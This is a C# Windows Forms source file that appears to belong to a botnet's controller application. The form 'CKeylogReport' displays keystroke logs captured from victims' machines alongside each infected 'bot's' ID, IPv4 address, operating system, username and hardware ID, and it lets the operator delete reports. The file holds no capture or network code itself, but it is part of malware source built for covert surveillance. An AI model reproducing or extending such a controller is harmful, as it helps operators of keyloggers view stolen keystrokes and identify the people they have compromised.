using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Controller.Forms
{
    public partial class CKeylogReport : DevExpress.XtraEditors.XtraForm
    {
        public delegate void delOnDeleteReport(int iReportID);
        public event delOnDeleteReport OnDeleteReport;

        private string m_strID = string.Empty;

        public CKeylogReport()
        {
            InitializeComponent();
        }

        private void CKeylogReport_Load(object sender, EventArgs e)
        {

        }

        public void OnReportDataInvoke(string strTitle, string strSize, string strData, string strID)
        {
            this.Invoke((MethodInvoker)delegate()
            {
                this.Text = string.Format(
                    "Report - Window Title: [{0}] Size: [{1}] ID: [{2}]",
                    strTitle, strSize, strID
                );
                this.txtReportData.Text = strData;
            });

            this.m_strID = strID;
        }

        public void OnBotDataInvoke(string strID, string strIPv4, string strOS, string strUsername, string strHWID)
        {
            this.Invoke((MethodInvoker)delegate()
            {
                this.lblBotID.Caption = string.Format("ID: {0}", strID);
                this.lblBotIPv4.Caption = string.Format("IPv4: {0}", strIPv4);
                this.lblBotOS.Caption = string.Format("OS: {0}", strOS);
                this.lblBotUsername.Caption = string.Format("Username: {0}", strUsername);
                this.lblBotHWID.Caption = string.Format("HWID: {0}", strHWID);
            });
        }

        private void btnDeleteReport_Click(object sender, EventArgs e)
        {
            if (this.OnDeleteReport == null) return;

            int iReportID = -1;

            if (int.TryParse(this.m_strID, out iReportID))
            {
                this.OnDeleteReport.Invoke(iReportID);
                this.Close();
            }
        }
    }
}
